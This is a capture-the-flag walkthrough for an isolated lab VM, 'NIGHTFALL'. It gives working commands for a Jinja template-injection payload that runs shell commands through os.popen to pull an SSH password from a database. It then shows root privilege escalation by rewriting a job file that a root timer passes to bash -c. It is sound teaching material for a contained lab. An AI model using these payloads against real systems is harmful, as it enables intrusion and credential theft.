# NIGHTFALL walkthrough — restricted solution material

This guide is for the author and authorized learners in an isolated VMware lab. Never point these commands at a system other than the local NIGHTFALL VM. Values shown as `<TARGET>` are the target's current Host-Only address; generated secrets are intentionally not recorded here.

## Preparation and reconnaissance

Place Kali and NIGHTFALL on the same Host-Only/Custom VMnet. Confirm the target has no default route, then identify its DHCP address. Scan only that private address:

```bash
nmap -sC -sV -oN nightfall-nmap.txt <TARGET>
curl -i http://<TARGET>/
```

The intended exposed services are SSH on TCP/22 and Nginx/HTTP on TCP/80. Gunicorn is bound to guest loopback TCP/5000. The home page identifies Nightfall Analytics and links the public report library.

## Web enumeration and source clue

Inspect headers, the report library, and common static artifacts:

```bash
curl -i http://<TARGET>/health
curl -i http://<TARGET>/static/report_renderer.py.bak
```

The backup identifies the preview endpoint, the internal workspace label `nightfall-internal`, the caller-provided `reviewed` value, and the use of `render_template_string`. The flaw is a trust-boundary failure plus server-side template injection: both supposed workflow state and report text are controlled by the caller.

## Demonstrate the preview flaw safely

First verify template evaluation with a harmless arithmetic expression. This does not execute a command:

```bash
curl -sS -X POST http://<TARGET>/api/v1/reports/preview \
  --data-urlencode 'workspace=nightfall-internal' \
  --data-urlencode 'reviewed=approved' \
  --data-urlencode 'body={{ 6 * 7 }}'
```

The response contains the rendered value `42`. A request with a different workspace returns 404; a missing or different review marker returns 403. Those values are not authenticated server-side, so the checks do not establish a trust boundary.

## Obtain the analyst credential and foothold

In this isolated target only, use the Jinja global to run a local SQLite query and return the internal operations handover report. The database contains a generated per-release SSH recovery password. This command executes only inside the target's web service account and connects to no other host:

```bash
curl -sS -X POST http://<TARGET>/api/v1/reports/preview \
  --data-urlencode 'workspace=nightfall-internal' \
  --data-urlencode 'reviewed=approved' \
  --data-urlencode "body={{ cycler.__init__.__globals__['os'].popen('sqlite3 /var/lib/nightfall/app/portal.db \"SELECT body FROM reports WHERE id=2;\"').read() }}"
```

Read the generated recovery password from the response, then connect to the intended user account:

```bash
ssh analyst@<TARGET>
id
cat /home/analyst/user.txt
```

Expected identity: `analyst`. The user flag is a 32-character lowercase hexadecimal value. Do not copy flag values into this document or shared logs.

## Local enumeration and root flag

As `analyst`, inspect the timer, service, helper ownership, and queue permissions:

```bash
systemctl list-timers --all | grep nightfall-maintenance
systemctl cat nightfall-maintenance.service
ls -ld /var/lib/nightfall/maintenance/queue
ls -l /var/lib/nightfall/maintenance/queue/nightfall.job /usr/local/sbin/nightfall-maintenance
sed -n '1,160p' /usr/local/sbin/nightfall-maintenance
```

The timer executes a root-owned helper. The analyst account can replace the job file; the helper passes the `postprocess` value to `/bin/bash -c`. Replace the job with a narrowly scoped proof command that copies the root flag into the writable queue and makes only that copy readable:

```bash
printf '%s\n' 'postprocess=/bin/cat /root/root.txt > /var/lib/nightfall/maintenance/queue/root-proof.txt && /bin/chmod 0644 /var/lib/nightfall/maintenance/queue/root-proof.txt' > /var/lib/nightfall/maintenance/queue/nightfall.job
sleep 35
cat /var/lib/nightfall/maintenance/queue/root-proof.txt
```

The timer is isolated from networking. The copy is evidence that the root-run maintenance path read the root-only flag; it is not an HTTP endpoint. The proof file is removed by reset. Validate that the value has the expected 32 lowercase hexadecimal characters without pasting it into shared output.

## Reset, remediation, and cleanup

From the target console run `sudo /opt/nightfall/scripts/reset.sh --confirm`. It restores the database and default maintenance job while preserving this release's flags and generated credentials. Shut down Kali and the target when finished; keep the VMware network Host-Only/Custom and do not add public port forwarding.

See `docs/remediation.md` for root causes and fixes. Test outputs vary in target IP and generated credentials; no captured successful exploit output has been fabricated in this document. The VM build and full path have not been run in this environment yet.
